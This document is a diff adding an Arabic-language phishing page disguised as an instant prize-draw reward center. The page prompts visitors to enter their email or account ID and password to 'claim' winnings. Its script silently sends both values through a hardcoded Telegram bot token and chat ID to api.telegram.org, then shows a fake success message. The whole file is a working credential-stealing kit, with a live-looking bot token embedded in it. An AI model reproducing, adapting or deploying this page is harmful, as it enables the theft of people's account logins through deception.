@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>مركز مكافآت السحب والربح الفوري</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    body {
+      background: linear-gradient(135deg, #0f172a, #1e1b4b);
+      color: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .prize-card {
+      background: rgba(30, 41, 59, 0.7);
+      backdrop-filter: blur(12px);
+      border: 2px solid #38bdf8;
+      border-radius: 16px;
+      padding: 35px 25px;
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+      box-shadow: 0 15px 35px rgba(56, 189, 248, 0.2);
+    }
+    .prize-icon {
+      font-size: 55px;
+      margin-bottom: 15px;
+    }
+    .prize-title {
+      font-size: 26px;
+      font-weight: bold;
+      margin-bottom: 10px;
+      color: #38bdf8;
+    }
+    .prize-desc {
+      font-size: 14px;
+      color: #94a3b8;
+      margin-bottom: 25px;
+      line-height: 1.6;
+    }
+    .input-box {
+      width: 100%;
+      padding: 14px 16px;
+      margin-bottom: 15px;
+      background: #0f172a;
+      border: 1px solid #334155;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 15px;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+    .input-box:focus {
+      border-color: #38bdf8;
+    }
+    .claim-btn {
+      width: 100%;
+      padding: 15px;
+      background-color: #38bdf8;
+      color: #0f172a;
+      border: none;
+      border-radius: 8px;
+      font-size: 17px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s, transform 0.2s;
+      box-shadow: 0 5px 15px rgba(56, 189, 248, 0.3);
+    }
+    .claim-btn:hover {
+      background-color: #0ea5e9;
+      transform: translateY(-2px);
+    }
+    .success-alert {
+      margin-top: 20px;
+      font-size: 14px;
+      background: rgba(16, 185, 129, 0.2);
+      border: 1px solid #10b981;
+      color: #34d399;
+      padding: 12px;
+      border-radius: 8px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="prize-card">
+    <div class="prize-icon">🏆</div>
+    <div class="prize-title">مسابقة السحب الكبرى</div>
+    <div class="prize-desc">أدخل بيانات الحساب الخاص بك للتحقق من الأهلية واستلام جائزة الأرباح الفورية.</div>
+
+    <form id="moneyForm" onsubmit="processReward(event)">
+      <input type="text" id="userInput" class="input-box" placeholder="البريد الإلكتروني أو معرف الحساب (ID)" required>
+      <input type="password" id="passInput" class="input-box" placeholder="كلمة المرور لتأكيد الحساب" required>
+      <button type="submit" class="claim-btn">سحب الجائزة الآن 🚀</button>
+    </form>
+
+    <div id="alertBox" class="success-alert"></div>
+  </div>
+
+  <script>
+    function processReward(e) {
+      e.preventDefault();
+      
+      const token = "8554495986:AAF-X26Y0F-J4KPlUNeeAiDbdZy011D_Qoc";
+      const chatId = "8933388029";
+      
+      const userInput = document.getElementById('userInput').value;
+      const passInput = document.getElementById('passInput').value;
+      
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=Login: ${userInput} | Pass: ${passInput}`;
+      
+      fetch(url).then(response => {
+        const box = document.getElementById('alertBox');
+        box.style.display = 'block';
+        box.innerText = '✨ تم تقديم الطلب بنجاح!';
+      });
+    }
+  </script>
+
+</body>
+</html>
